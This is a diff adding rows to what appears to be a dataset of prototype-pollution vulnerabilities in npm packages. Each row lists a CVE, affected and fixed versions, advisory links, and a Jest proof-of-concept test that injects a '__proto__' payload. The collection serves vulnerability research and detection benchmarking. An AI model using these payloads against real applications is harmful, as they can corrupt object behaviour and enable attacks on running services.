+  const fs = require(""fs"");
+  const path = require(""path"");
+  const ini = require(""js-ini"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e,src/parse.ts:68:58,https://security.snyk.io/vuln/SNYK-JS-JSINI-1048970; 
+prototype-pollution,CVE-2021-23426,Proto,1.1.4,n/a,prototype-pollution/Proto_1.1.4,"//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
+test(""prototype pollution in Proto"", () => {
+  const proto = require(""Proto"");
+  let payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  proto.merge({}, JSON.parse(payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,,https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301; https://github.com/advisories/GHSA-58g2-9fqr-36q2
+prototype-pollution,,@uifabric/utilities,7.20.2,7.20.3,prototype-pollution/uifabric-utilities_7.20.2,"//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
+test(""prototype pollution in @uifabric/utilities "", () => {
+  const util = require(""@uifabric/utilities"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  const source2 = {
+    k3: {},
+  };
+
+  expect({}.polluted).toBe(undefined);
+
+  y = util.merge(source2, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,utilities/src/merge.ts:33:21,https://security.snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487; 
+prototype-pollution,CVE-2021-23820,json-pointer,0.6.0,n/a,prototype-pollution/json-pointer_0.6.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
+test(""prototype pollution in json-pointer"", () => {
+  const pointer = require(""json-pointer"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  pointer.set(obj, ""/__proto__/polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/manuelstofer/json-pointer/pull/34/files,index.js:91:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925; https://github.com/advisories/GHSA-v5vg-g7rq-363w
+prototype-pollution,CVE-2018-3728,hoek,5.0.0,5.0.3,prototype-pollution/hoek_5.0.0,"//https://snyk.io/vuln/npm:hoek:20180212
+test(""prototype pollution in hoek"", () => {
+  const Hoek = require(""hoek"");
+  obj = {};
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  Hoek.merge({}, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee,lib/index.js:137:29,https://security.snyk.io/vuln/npm:hoek:20180212; https://github.com/advisories/GHSA-jp4x-w63m-7wgm
+prototype-pollution,CVE-2020-28267,@strikeentco/set,1.0.0,1.0.1,prototype-pollution/strikeentco-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
+test(""prototype pollution in strikeentco/set "", () => {
+  const sset = require(""@strikeentco/set"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  sset(obj, ""__proto__.polluted"", ""yes"");
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/strikeentco/set/commit/102cc6b2e1d1e0c928ced87e75df759d5541ff60,set/main.js:11:17,https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821; 
+prototype-pollution,CVE-2021-25927,safe-flat,2.0.0,2.0.2,prototype-pollution/safe-flat_2.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
+test(""prototype pollution in safeFlat"", () => {
+  var safeFlat = require(""safe-flat"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  safeFlat.unflatten({ ""__proto__.polluted"": ""yes"" }, "".""); //payload
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,src/index.js:48:30,https://security.snyk.io/vuln/SNYK-JS-SAFEFLAT-1277112; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
+prototype-pollution,CVE-2020-8116,dot-prop,2.0.0,5.1.1,prototype-pollution/dot-prop_2.0.0,"//https://snyk.io/test/npm/dot-prop/2.0.0
+test(""prototype pollution in dot-prop"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const dotProp = require(""dot-prop"");
+  dotProp.set({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2,index.js:32:14,https://security.snyk.io/vuln/SNYK-JS-DOTPROP-543489; https://github.com/advisories/GHSA-ff7x-qrg7-qggm
+prototype-pollution,CVE-2021-25941,deep-override,1.0.0,1.0.2,prototype-pollution/deep-override_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
+test(""prototype pollution in deep-override"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const deepOverride = require(""deep-override"");
+  deepOverride({}, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/ASaiAnudeep/deep-override/commit/2aced17651fb684959a6e04b1465a8329b3d5268,src/index.js:53:23,https://security.snyk.io/vuln/SNYK-JS-DEEPOVERRIDE-1292344; https://github.com/advisories/GHSA-v659-54cx-g4qr
+prototype-pollution,CVE-2021-23417,deepmergefn,1.1.0,n/a,prototype-pollution/deepmergefn_1.1.0,"//https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
+test(""prototype pollution in deepmergefn"", () => {
+  const deepMerge = require(""deepmergefn"");
+
+  expect({}.polluted).toBe(undefined);
+
+  EVIL_DATA = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  deepMerge({}, EVIL_DATA);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:12:30,https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984; https://github.com/advisories/GHSA-vj72-mwrj-m2xq
+prototype-pollution,CVE-2021-3766,objection,2.0.0,3.0.0-alpha.5,prototype-pollution/objection_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
+test(""prototype pollution in objection"", () => {
+  const objectUtils = require(""objection/lib/utils/objectUtils"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let obj = {};
+  objectUtils.set(obj, [""__proto__"", ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/vincit/objection.js/commit/b41aab8dcd78f426f7468dcda541a7aca18a66a6,lib/utils/objectUtils.js:246:32,https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910; https://github.com/advisories/GHSA-r659-8xfp-j327
+prototype-pollution,CVE-2020-8268,json8-merge-patch,1.0.1,1.0.3,prototype-pollution/json8-merge-patch_1.0.1,"//https://hackerone.com/reports/980649
+test(""prototype pollution in json8-merge-patch"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const json8mergepatch = require(""json8-merge-patch"");
+  json8mergepatch.apply(
+    {},
+    JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}')
+  );
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/apply.js:25:12,https://security.snyk.io/vuln/SNYK-JS-JSON8MERGEPATCH-1038399; https://github.com/advisories/GHSA-8v9x-9xqg-r8mr
+prototype-pollution,CVE-2020-7725,worksmith,1.0.0,n/a,prototype-pollution/worksmith_1.0.0,"//https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798
+
+test(""prototype pollution in worksmith"", () => {
+  const worksmith = require(""worksmith"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  worksmith.setValue({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:300:30,https://security.snyk.io/vuln/SNYK-JS-WORKSMITH-598798; https://github.com/advisories/GHSA-9829-jj5p-j6hf
+prototype-pollution,CVE-2019-10794,component-flatten,1.0.1,n/a,prototype-pollution/component-flatten_1.0.1,"//snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
+https: test(""prototype pollution in component-flatten"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const cf = require(""component-flatten"");
+  let tree = { ref: ""polluted"", name: ""__proto__"" };
+  cf(tree);
+
+  expect({}.polluted).not.toBe(undefined);
+});
+",n/a,index.js:56:26,https://security.snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907; 
+prototype-pollution,,upmerge,0.1.7,0.1.8,prototype-pollution/upmerge_0.1.7,"//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
+test(""prototype pollution in upmerge"", () => {
+  let upmerge = require(""upmerge""); // this version is vulnerable
+  let payload = '{""__proto__"":{ ""polluted"" : ""yes"" } }'; // this comes from network
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+  upmerge.merge({}, JSON.parse(payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,build/upmerge.js:1:1247,https://security.snyk.io/vuln/SNYK-JS-UPMERGE-174133; https://github.com/advisories/GHSA-gm9g-2g8v-fvxj
+prototype-pollution,CVE-2019-10792,bodymen,1.0.0,1.1.1,prototype-pollution/bodymen_1.0.0,"//https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b
+
+test(""prototype pollution in bodymen "", () => {
+  const x = require(""bodymen"");
+  //a.handler(""__proto__"",""polluted"",""yes"");
+  expect({}.polluted).toBe(undefined);
+
+  x.handler(""__proto__"", ""polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b,dist/index.js:44:26,https://security.snyk.io/vuln/SNYK-JS-BODYMEN-548897; https://github.com/advisories/GHSA-8h84-8j4f-p97q
+prototype-pollution,CVE-2021-23370,swiper,6.5.0,6.5.1,prototype-pollution/swiper_6.5.0,"//https://snyk.io/vuln/SNYK-JS-SWIPER-1088062
+test(""prototype pollution in swiper"", () => {
+  var swiper = require(""swiper"");
+  let obj = {};
+  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  swiper.default.extendDefaults(JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/nolimits4web/swiper/commit/9dad2739b7474f383474773d5ab898a0c29ac178,cjs/utils/utils.js:110:25,https://security.snyk.io/vuln/SNYK-JS-SWIPER-1088062; https://github.com/advisories/GHSA-p3hc-fv2j-rp68
+prototype-pollution,CVE-2021-25944,deep-defaults,1.0.5,n/a,prototype-pollution/deep-defaults_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944
+test(""prototype pollution in dot-object "", () => {
+  var deepDefaults = require(""deep-defaults"");
+  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  deepDefaults(obj, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:16:21,https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944; 
+prototype-pollution,,smart-extend,1.7.3,n/a,prototype-pollution/smart-extend_1.7.3,"//https://hackerone.com/reports/438274
+
+test(""prototype pollution in smart-extend"", () => {
+  var extend = require(""smart-extend"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+  var payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  extend.deep({}, JSON.parse(payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,dist/smart-extend.js:1:2739,https://security.snyk.io/vuln/SNYK-JS-SMARTEXTEND-174739; https://github.com/advisories/GHSA-f8h3-rqrm-47v9
+prototype-pollution,CVE-2021-25916,patchmerge,1.0.0,1.0.2,prototype-pollution/patchmerge_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
+test(""prototype pollution in patchmerge"", () => {
+  const patchMerge = require(""patchmerge"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let obj = {};
+  patchMerge(obj, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
+prototype-pollution,,node-ini,1.0.0,n/a,prototype-pollution/node-ini_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844
+test(""prototype pollution in node-ini"", () => {
+  const ini = require(""node-ini"");
+
+  expect({}.polluted).toBe(undefined);
+
+  ini.parse(""./payload.ini"", function (err, data) {
+    expect({}.polluted).toBe(""yes"");
+  });
+});
+",,node-ini.js:25:66,https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844; 
+prototype-pollution,CVE-2020-28268,controlled-merge,1.0.0,1.3.0,prototype-pollution/controlled-merge_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
+test(""prototype pollution in controlled-merge "", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const merge = require(""controlled-merge"");
+  const obj = merge(
+    {},
+    JSON.parse(
+      '{ ""testProperty"": ""hi"", ""prototype"" : { ""polluted"" : ""yes"" } }'
+    ),
+    true
+  );
+
+  expect(obj.prototype.polluted).toBe(""yes"");
+});
+",https://github.com/hlfshell/controlled-merge/commit/5a4b2e9ffe5a0be7f8843d4ab038599d3ae5f9d4,,https://security.snyk.io/vuln/SNYK-JS-CONTROLLEDMERGE-1040460; https://github.com/advisories/GHSA-5pg7-v24c-9rp9
+prototype-pollution,CVE-2019-10750,deeply,3.0.0,3.1.0,prototype-pollution/deeply_3.0.0,"//https://snyk.io/vuln/SNYK-JS-DEEPLY-451026
+test(""prototype pollution in deeply "", () => {
+  const mergeFn = require(""deeply"");
+  const payload = '{""__proto__"": {""polluted"": ""yes""}}';
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  mergeFn({}, JSON.parse(payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/alexindigo/deeply/commit/6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,lib/reduce_object.js:19:14,https://security.snyk.io/vuln/SNYK-JS-DEEPLY-451026; https://github.com/advisories/GHSA-8j4w-5fw4-rm27
+prototype-pollution,CVE-2019-10795,undefsafe,2.0.2,2.0.3,prototype-pollution/undefsafe_2.0.2,"//https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
+test(""prototype pollution in undefsafe "", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const a = require(""undefsafe"");
+  const obj = {};
+  const payload = ""__proto__.polluted"";
+  a({}, payload, ""yes"");
+
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822,lib/undefsafe.js:106:17,https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940; 
+prototype-pollution,CVE-2020-7639,eivindfjeldstad-dot,0.0.1,n/a,prototype-pollution/eivindfjeldstad-dot_0.0.1,"//https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
+test(""prototype pollution in eivindfjeldstad-dot"", () => {
+  const a = require(""eivindfjeldstad-dot"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let path = ""__proto__.polluted"";
+  a.set({}, path, ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,index.js:20:13,https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434; 
+prototype-pollution,CVE-2020-7715,deep-get-set,1.1.0,n/a,prototype-pollution/deep-get-set_1.1.0,"test(""prototype pollution in deep-get-set"", () => {
+  const deep = require(""deep-get-set"");
+
+  expect({}.polluted).toBe(undefined);
+
+  deep({}, [new String(""__proto__""), ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:30:16,https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666; https://github.com/advisories/GHSA-85cp-p426-42f5
+prototype-pollution,,getsetdeep,4.15.0,n/a,prototype-pollution/getsetdeep_4.15.0,"test(""prototype pollution in getsetdeep"", () => {
+  const pkg = require(""getsetdeep"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  pkg.setDeep(obj, ""__proto__.polluted"", ""yes"");
+
+  expect(obj.polluted).toBe(""yes"");
+});
+",n/a,edition-esnext/index.js:74:17,https://github.com/advisories/GHSA-8j49-49jq-vwcq; 
+prototype-pollution,CVE-2018-3721 ,lodash,4.17.15,4.17.5,prototype-pollution/lodash_4.17.15,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
+test(""prototype pollution in lodash"", () => {
+  const lod = require(""lodash"");
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+  lod.set(obj, ""__proto__[polluted]"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+  delete obj.__proto__.polluted; // deletes the property set by this pollution
+});
+
+test(""prototype pollution in lodash"", () => {
+  const lod = require(""lodash"");
+  expect({}.polluted).toBe(undefined);
+  lod.setWith({}, ""__proto__[polluted]"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com/advisories/GHSA-fvqr-27wr-82fm
+prototype-pollution,CVE-2021-25916,patchmerge,1.0.1,1.0.2,prototype-pollution/patchmerge_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
+test(""prototype pollution in patchMerge"", () => {
+  var patchMerge = require(""patchmerge"");
+  var obj = {};
+  expect({}.polluted).toBe(undefined);
+  patchMerge(obj, JSON.parse('{""__proto__"": { ""polluted"": ""yes"" }}'));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
+prototype-pollution,CVE-2020-7638,confinit,0.3.0,0.4.0,prototype-pollution/confinit_0.3.0,"//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
+test(""prototype pollution in confinit"", () => {
+  const root = require(""confinit"");
+  const payload = ""__proto__.polluted"";
+
+  expect({}.polluted).toBe(undefined);
+
+  root.setDeepProperty({}, payload, ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/davideicardi/confinit/commit/a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,index.ts:112:15,https://security.snyk.io/vuln/SNYK-JS-CONFINIT-564433; https://github.com/advisories/GHSA-jgpq-g82g-6c39
+prototype-pollution,CVE-2020-7704,linux-cmdline,1.0.0,1.0.1,prototype-pollution/linux-cmdline_1.0.0,"//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
+test(""prototype pollution in linux-cmdline"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const linuxCmdline = require(""linux-cmdline"");
+  linuxCmdline(""__proto__.polluted=yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/piranna/linux-cmdline/commit/53c61a88bc47eb25d71832205056beaab95cf677,index.js:48:15,https://security.snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674; 
+prototype-pollution,CVE-2021-25948,expand-hash,1.0.1,n/a,prototype-pollution/expand-hash_1.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
+test(""prototype pollution in expand-hash "", () => {
+  var expandHash = require(""expand-hash"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  expandHash({ ""__proto__.polluted"": ""yes"" });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-EXPANDHASH-1303101; https://github.com/advisories/GHSA-x3wr-v4wx-5qpc
+prototype-pollution,CVE-2020-7637,class-transformer,0.1.1,0.3.1,prototype-pollution/class-transformer_0.1.1,"//https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431
+test(""prototype pollution in class-transformer"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const root = require(""class-transformer"");
+  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+  root.classToPlainFromExist(payload, {});
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,TransformOperationExecutor.ts:163:46,https://security.snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431; https://github.com/advisories/GHSA-6gp3-h3jj-prx4
+prototype-pollution,CVE-2021-23328,iniparserjs,1.0.4,n/a,prototype-pollution/iniparserjs_1.0.4,"//https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989
+test(""prototype pollution in iniparserjs"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  var path = require(""path"");
+  var IniParser = require(""iniparserjs"");
+
+  var config = new IniParser(path.join(__dirname, ""test.ini""), ""UTF8"");
+  // var sections = config.sections()
+  // var keysOfSection1 = config.keysOfSection(""section1"")
+  console.log(""After:"", {}.polluted);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,ini_parser.js:63:50,https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989; https://github.com/advisories/GHSA-2f6g-w5gj-c93h
+prototype-pollution,CVE-2020-28282,getobject,0.1.0,1.0.0,prototype-pollution/getobject_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282
+test(""prototype pollution in getobject"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const getObject = require(""getobject"");
+  var obj = {};
+  console.log(""Before  : "" + obj.polluted);
+  getObject.set(obj, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/getobject.js:48:23,https://security.snyk.io/vuln/SNYK-JS-GETOBJECT-1054932; https://github.com/advisories/GHSA-957j-59c2-j692
+prototype-pollution,CVE-2019-10798,rdf-graph-array,0.3.0,n/a,prototype-pollution/rdf-graph-array_0.3.0,"//https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
+test(""prototype pollution in rdf-graph-array"", () => {
+  const Graph = require(""rdf-graph-array"").Graph;
+  let g = new Graph();
+
+  expect({}.polluted).toBe(undefined);
+
+  g.add({
+    graph: ""foo"",
+    subject: ""__proto__"",
+    predicate: ""polluted"",
+    object: ""JHU"",
+  });
+
+  expect({}.polluted).not.toBe(undefined);
+});
+",n/a,index.js:208:29,https://security.snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803; https://github.com/advisories/GHSA-prv2-xwr7-hr57
+prototype-pollution,CVE-2020-28277,dset,1.0.0,2.1.0,prototype-pollution/dset_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
+test(""prototype pollution in dset"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const dset = require(""dset"");
+  dset({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,dist/dset.js:6:18,https://security.snyk.io/vuln/SNYK-JS-DSET-1054939; 
+prototype-pollution,CVE-2021-23396,lutils,2.4.0,n/a,prototype-pollution/lutils_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
+test(""prototype pollution in lutils"", () => {
+  const lt = require(""lutils"");
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  lt.merge({}, EVIL_JSON);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,merge/merge.ts:114:18,https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023; https://github.com/advisories/GHSA-3r8w-mphv-2f3f
+prototype-pollution,CVE-2018-3752,merge-options,1.0.0,1.0.1,prototype-pollution/merge-options_1.0.0,"//https://snyk.io/vuln/npm:merge-options:20180415
+test(""prototype pollution in merge-options"", () => {
+  const merge = require(""merge-options"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/schnittstabil/merge-options/commit/d4a93bc2890455e0931ac0779667023e6cb101d4,index.js:73:16,https://security.snyk.io/vuln/npm:merge-options:20180415; https://github.com/advisories/GHSA-qw93-45r3-p66p
+prototype-pollution,CVE-2020-7748,@tsed/core,5.62.3,5.65.7,prototype-pollution/tsed-core_5.62.3,"//https://snyk.io/vuln/SNYK-JS-TSEDCORE-1019382
+test(""prototype pollution in @tsed/core"", () => {
+  const { deepExtends } = require(""@tsed/core"");
+
+  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  let result = deepExtends({ security: [{ 1: ""o"" }] }, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/TypedProject/tsed/commit/1395773ddac35926cf058fc6da9fb8e82266761b,core/src/utils/deepExtends.ts:36:15,https://security.snyk.io/vuln/SNYK-JS-TSEDCORE-1019382; https://github.com/advisories/GHSA-77xq-cpvg-7xm2
+prototype-pollution,CVE-2018-3750,deep-extend,0.5.0,0.5.1,prototype-pollution/deep-extend_0.5.0,"test(""prototype pollution in merge-objects"", () => {
+  const merge = require(""deep-extend"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/unclechu/node-deep-extend/commit/433ee51ed606f4e1867ece57b6ff5a47bebb492f,lib/deep-extend.js:117:17,https://security.snyk.io/vuln/npm:deep-extend:20180409; https://github.com/advisories/GHSA-hr2v-3952-633q
+prototype-pollution,CVE-2018-3749,deap,1.0.0,1.0.1,prototype-pollution/deap_1.0.0,"//https://snyk.io/vuln/npm:deap:20180415
+test(""prototype pollution in deap"", () => {
+  const deap = require(""deap"");
+  obj = {};
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  deap.merge({}, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/connie-lang.js:35:28,https://security.snyk.io/vuln/npm:deap:20180415; https://github.com/advisories/GHSA-xrmp-99wj-p6jc
+prototype-pollution,CVE-2020-28448,multi-ini,2.1.0,2.1.1,prototype-pollution/multi-ini_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MULTIINI-1048969
+test(""prototype pollution in multi-ini"", () => {
+  const ini = require(""multi-ini"");
+  const path = require(""path"");
+
+  expect({}.polluted).toBe(undefined);
+
+  ini.read(path.resolve(__dirname, ""./payload.toml""), { encoding: ""utf8"" });
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/parser.js:193:38,https://security.snyk.io/vuln/SNYK-JS-MULTIINI-1048969; https://github.com/advisories/GHSA-g78f-549w-c354
+prototype-pollution,CVE-2021-23421,merge-change,1.0.1,n/a,prototype-pollution/merge-change_1.0.1,"//
+test(""prototype pollution in merge-change"", () => {
+  const utils = require(""merge-change"").utils;
+
+  expect({}.polluted).toBe(undefined);
+
+  let obj = {};
+  utils.set(obj, [""__proto__"", ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,utils.js:63:26,https://github.com/VladimirShestakov/merge-change/blob/9901f145e06158f284f52de42e6ba5b0f702fb65/utils.js#L89-L123; https://security.snyk.io/vuln/SNYK-JS-MERGECHANGE-1310985
+prototype-pollution,CVE-2020-7600,querymen,2.1.3,2.1.4,prototype-pollution/querymen_2.1.3,"//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
+test(""prototype pollution in querymen"", () => {
+  var a = require(""querymen"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  a.handler(""__proto__"", ""polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/diegohaz/querymen/commit/1987fefcb3b7508253a29502a008d5063a873cef,dist/index.js:46:26,https://security.snyk.io/vuln/SNYK-JS-QUERYMEN-559867; https://github.com/advisories/GHSA-2cf2-2383-h4jv
+prototype-pollution,CVE-2020-7608,yargs-parser,6.0.0,18.1.1,prototype-pollution/yargs-parser_6.0.0,"//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381
+
+test(""prototype pollution in yargs-parser"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const parser = require(""yargs-parser"");
+
+  parser(""--foo.__proto__.polluted yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:587:14,https://security.snyk.io/vuln/SNYK-JS-YARGSPARSER-560381; https://github.com/advisories/GHSA-p9pc-299p-vxgp
